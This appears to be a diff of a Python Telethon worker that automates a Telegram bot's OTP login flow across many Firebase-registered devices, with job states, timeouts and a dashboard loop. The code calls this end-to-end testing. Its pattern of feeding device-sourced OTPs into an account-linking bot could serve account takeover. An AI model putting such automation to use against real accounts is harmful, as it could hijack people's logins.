+            print()
+            print("CANCELLATION CONFIRMED")
+
+            set_state("CANCELLED")
+
+            if pending_finish_after_cancel and current_job:
+
+                status = pending_finish_status or "failed"
+                error = pending_finish_error or "Conversation cancelled"
+
+                pending_finish_after_cancel = False
+                pending_finish_status = ""
+                pending_finish_error = ""
+
+                await finish_and_start_next(
+                    status,
+                    error,
+                )
+
+                return
+
+            if pending_restart_after_cancel and current_job:
+                pending_restart_after_cancel = False
+                print(f"[{now()}] Cancellation confirmed. Restarting /start for the same device.")
+                set_state("WAITING_FOR_MENU")
+                await send_start_if_needed(force=True)
+
+            return
+
+        # --------------------------------------------------------
+        # NO ACTIVE JOB
+        # --------------------------------------------------------
+        if current_job is None:
+
+            print("No active Firebase device job.")
+            return
+
+        job_id = current_job["id"]
+
+        # --------------------------------------------------------
+        # MAIN MENU
+        # --------------------------------------------------------
+        if (
+            "welcome to" in lower
+            and event.message.buttons
+        ):
+
+            print()
+            print("MAIN MENU RECEIVED")
+            set_state("MENU_RECEIVED")
+
+            if find_login_button(event.message) is None:
+
+                print(
+                    f"[{now()}] Login via OTP button not present."
+                )
+                print(
+                    f"[{now()}] Sending /start and waiting for UI."
+                )
+
+                set_state("WAITING_FOR_MENU")
+
+                try:
+                    await send_start_if_needed()
+                except Exception as e:
+                    print(
+                        f"[{now()}] Failed to resend /start: {e}"
+                    )
+
+                return
+
+            await click_login_button_from_message(event.message)
+            return
+
+        # --------------------------------------------------------
+        # NUMBER REQUEST
+        # --------------------------------------------------------
+        if "enter the 10-digit" in lower:
+
+            await submit_selected_test_number()
+            return
+
+        # --------------------------------------------------------
+        # OTP REQUEST
+        # --------------------------------------------------------
+        if (
+            "otp sent successfully" in lower
+            or "enter the 6-digit otp" in lower
+        ):
+
+            set_state("WAITING_FOR_OTP")
+
+            update_worker_status(
+                current_job["database"],
+                "waiting_for_otp",
+                job_id,
+            )
+
+            print()
+            print("OTP REQUEST RECEIVED")
+            print(
+                f"Starting {OTP_TIMEOUT_SECONDS}s timeout."
+            )
+
+            if TEST_MODE:
+                try:
+                    capture_test_response_baseline()
+                except Exception as e:
+                    print(
+                        f"[{now()}] Could not capture response baseline: {e}"
+                    )
+
+            start_otp_timer(job_id)
+
+            if TEST_MODE:
+                start_test_response_poll(job_id)
+
+            return
+
+        # --------------------------------------------------------
+        # VERIFYING
+        # --------------------------------------------------------
+        if "verifying" in lower:
+
+            await stop_otp_timer()
+            await stop_test_response_poll()
+
+            set_state("VERIFYING")
+
+            update_worker_status(
+                current_job["database"],
+                "verifying",
+                job_id,
+            )
+
+            return
+
+        # --------------------------------------------------------
+        # SUCCESS
+        # --------------------------------------------------------
+        if (
+            "login successful" in lower
+            or "successfully linked" in lower
+        ):
+
+            print()
+            print("=" * 60)
+            print("END-TO-END TEST SUCCESS")
+            print("=" * 60)
+            print("Job:", job_id)
+            print("Device:", current_job.get("device_id"))
+            print("Verification completed by Telegram bot.")
+            print("Marking job completed and moving to next device...")
+
+            await finish_and_start_next("success")
+            return
+
+        # --------------------------------------------------------
+        # FAILURE
+        # --------------------------------------------------------
+        #
+        # A stale "Invalid OTP" message can arrive while a new
+        # /start/menu flow is being opened. Only treat errors as
+        # fatal while actually inside the input/verification states.
+        failure_phrases = [
+            "otp request failed",
+            "account is suspended",
+            "invalid otp",
+            "login failed",
+            "request failed",
+            "invalid number format",
+            "unable to process",
+            "something went wrong",
+            "error occurred",
+        ]
+
+        flow_states = {
+            "WAITING_FOR_NUMBER",
+            "WAITING_FOR_OTP",
+            "VERIFYING",
+        }
+
+        stale_menu_error = (
+            state in {"STARTING", "WAITING_FOR_MENU", "MENU_RECEIVED"}
+            and "invalid number format" in lower
+        )
+
+        if (
+            (state in flow_states or stale_menu_error)
+            and any(
+                phrase in lower
+                for phrase in failure_phrases
+            )
+        ):
+
+            print()
+            print("BOT REPORTED FAILURE")
+            print("Job:", job_id)
+            print("Current state:", state)
+
+            await stop_otp_timer()
+            await stop_test_response_poll()
+
+            if stale_menu_error:
+                pending_restart_after_cancel = True
+                await cancel_current_conversation(
+                    "Stale Telegram number-entry state"
+                )
+            else:
+                await request_cancel_and_finish(
+                    "failed",
+                    text,
+                    "Bot reported failure",
+                )
+
+            return
+
+        # --------------------------------------------------------
+        # STILL WAITING FOR UI
+        # --------------------------------------------------------
+        if state in {
+            "STARTING",
+            "WAITING_FOR_MENU",
+            "MENU_RECEIVED",
+        }:
+
+            print(
+                f"[{now()}] Waiting for the expected Telegram UI."
+            )
+
+            return
+
+# ============================================================
+# TELEGRAM CALLBACK MONITOR
+# ============================================================
+
+@client.on(
+    events.CallbackQuery(
+        chats=BOT_USERNAME
+    )
+)
+async def callback_handler(event):
+
+    print()
+    print(
+        "BUTTON CALLBACK"
+    )
+
+    print(
+        "Data:",
+        event.data,
+    )
+
+
+# ============================================================
+# WORKER LOOP
+# ============================================================
+
+async def worker_loop():
+
+    print()
+    print("=" * 60)
+    print("FIREBASE + TELEGRAM WORKER")
+    print("=" * 60)
+
+    print("Bot:", BOT_USERNAME)
+    print("OTP timeout:", OTP_TIMEOUT_SECONDS)
+    print("Test name:", args.name)
+    print("Controlled TEST_MODE:", TEST_MODE)
+    print(
+        "Device discovery: parallel Firebase clients nodes; "
+        "active response polling: selected device Firebase only"
+    )
+    print("=" * 60)
+
+    dashboard_log("Worker starting")
+    dashboard_log("Performing initial parallel Firebase discovery...")
+
+    await refresh_device_registry(force=True)
+
+    registry_task = asyncio.create_task(registry_refresh_loop())
+    dashboard_task = asyncio.create_task(dashboard_loop())
+
+    try:
+        while True:
+            try:
+                if current_job is None:
+                    await start_next_job()
+
+                await asyncio.sleep(1)
+
+            except Exception as e:
+                dashboard_log(f"WORKER ERROR: {e}")
+
+                if current_job:
+                    update_job_status(
+                        current_job,
+                        "failed",
+                        str(e),
+                    )
+
+                    try:
+                        await cancel_current_conversation("Worker exception")
+                    except Exception:
+                        pass
+
+                    await finish_current_job()
+
+                await asyncio.sleep(3)
+
+    finally:
+        registry_task.cancel()
+        dashboard_task.cancel()
+
+        await asyncio.gather(
+            registry_task,
+            dashboard_task,
+            return_exceptions=True,
+        )
+
+
+# ============================================================
+# MAIN
+# ============================================================
+
+async def main():
+
+    print(
+        "Connecting to Telegram..."
+    )
+
+    await client.start()
+
+    me = await client.get_me()
+
+    print(
+        "Logged in as:",
+        getattr(
+            me,
+            "username",
+            None,
+        )
+        or getattr(
+            me,
+            "first_name",
+            "unknown",
+        ),
+    )
+
+    print(
+        "Listening to:",
+        BOT_USERNAME,
+    )
+
+    await worker_loop()
+
+
+# ============================================================
+# RUN
+# ============================================================
+
+if __name__ == "__main__":
+
+    try:
+
+        asyncio.run(
+            main()
+        )
+
+    except KeyboardInterrupt:
+
+        print()
+        print(
+            "Worker stopped."
+        )
+
+        try:
+
+            if current_job:
+
+                update_job_status(
+                    current_job,
+                    "stopped",
+                )
+
+                update_worker_status(
+                    current_job["database"],
+                    "stopped",
+                )
+
+        except Exception:
+
+            pass
